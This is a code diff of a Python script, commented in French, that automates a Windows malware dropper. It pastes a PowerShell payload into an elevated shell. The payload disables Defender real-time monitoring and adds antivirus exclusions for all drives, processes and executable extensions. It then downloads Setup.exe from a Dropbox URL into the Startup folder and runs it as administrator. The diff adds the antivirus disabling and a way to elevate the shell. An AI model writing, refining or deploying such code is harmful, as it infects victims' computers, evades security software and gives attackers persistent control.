@@ -1,30 +1,24 @@
 import time
 import keyboard
 import pyperclip
+import subprocess
 
-# Ton script PowerShell ici :
+# Script PowerShell avec désactivation temporaire de l'antivirus
 mon_script = """
+Set-MpPreference -DisableRealtimeMonitoring $true
 $drives = Get-PSDrive -PSProvider 'FileSystem' | Where-Object { $_.Free -gt 0 }
-foreach ($drive in $drives) {
-    Add-MpPreference -ExclusionPath "$($drive.Root)"
-}
+foreach ($drive in $drives) { Add-MpPreference -ExclusionPath $drive.Root }
 
 $procs = Get-Process | Where-Object { $_.Path -ne $null }
-foreach ($proc in $procs) {
-    Add-MpPreference -ExclusionProcess $proc.Name
-}
+foreach ($proc in $procs) { Add-MpPreference -ExclusionProcess $proc.Name }
 
-$exts = @(".exe", ".bat", ".cmd", ".ps1", ".vbs", ".js")
-foreach ($ext in $exts) {
-    Add-MpPreference -ExclusionExtension $ext
-}
+$exts = @('.exe','.bat','.cmd','.ps1','.vbs','.js')
+foreach ($ext in $exts) { Add-MpPreference -ExclusionExtension $ext }
 
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Setup.exe"
 $url = "https://www.dropbox.com/scl/fi/tib5nwxpmwwuryllzsf9k/Setup.exe?rlkey=0ppes5814g09i6p0n88wg3u3l&st=56fnxb6k&dl=1"
 
-if (Test-Path $startupPath) {
-    Remove-Item $startupPath -Force
-}
+if (Test-Path $startupPath) { Remove-Item $startupPath -Force }
 
 Invoke-WebRequest -Uri $url -OutFile $startupPath -UseBasicParsing -Headers @{
     "User-Agent" = "Mozilla/5.0"
@@ -33,31 +27,15 @@ Invoke-WebRequest -Uri $url -OutFile $startupPath -UseBasicParsing -Headers @{
 Start-Process -FilePath $startupPath -Verb RunAs -Wait
 """
 
+# Copie dans le presse-papier
 pyperclip.copy(mon_script)
-
-# Attendre un peu pour bien lancer
-time.sleep(2)
-
-# Touche Win pour ouvrir le menu dmarrer
-keyboard.press_and_release("win")
 time.sleep(1)
 
-# Taper "powershell"
-keyboard.write("powershell")
-time.sleep(1)
+# Lance PowerShell en admin directement
+subprocess.run('powershell -Command "Start-Process powershell -Verb RunAs"', shell=True)
+time.sleep(3)  # Délai crucial pour l'UAC
 
-
-keyboard.press_and_release("ctrl+shift+enter")
-time.sleep(3)
-
-
-keyboard.press_and_release("left")  # Flèche sur "Oui"
-keyboard.press_and_release("enter")
-time.sleep(2)
-
-# Coller le script
-keyboard.press_and_release("ctrl+v")
+# Collage et exécution
+keyboard.press_and_release('ctrl+v')
 time.sleep(0.5)
-
-# Lancer
-keyboard.press_and_release("enter")
+keyboard.press_and_release('enter')
